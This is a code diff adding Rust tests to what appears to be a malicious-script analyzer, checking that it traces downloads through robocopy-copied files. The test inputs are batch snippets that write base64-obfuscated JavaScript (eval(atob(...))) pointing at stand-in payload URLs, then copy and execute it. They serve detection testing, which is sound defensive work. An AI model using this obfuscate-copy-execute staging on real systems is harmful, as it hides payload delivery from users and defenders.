@@ -8373,6 +8373,58 @@ mod bitsadmin_tests {
 
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+mod robocopy_tests {
+    use crate::analyze;
+    use crate::env::Config;
+    use crate::traits::Trait;
+
+    #[test]
+    fn robocopy_preserves_generated_script_content_for_later_execution() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vcm9ib2NvcHktZGlyLWpzLmV4YW1wbGUvcGF5bG9hZCc=")) > C:\Work\original.js
+robocopy C:\Work C:\Temp original.js
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://robocopy-dir-js.example/payload"
+                )
+            }),
+            "robocopy copied generated JS content was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn robocopy_explicit_source_dir_does_not_use_unrelated_basename_content() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vcm9ib2NvcHktd3JvbmctYmFzZW5hbWUuZXhhbXBsZS9wYXlsb2FkJw==")) > D:\Other\original.js
+robocopy C:\Work C:\Temp original.js
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://robocopy-wrong-basename.example/payload"
+                )
+            }),
+            "robocopy explicit source dir reused unrelated basename content: {:?}",
+            report.traits
+        );
+    }
+}
+
+#[cfg(test)]
+#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod wmic_tests {
     use crate::analyze;
     use crate::env::{Config, Environment};
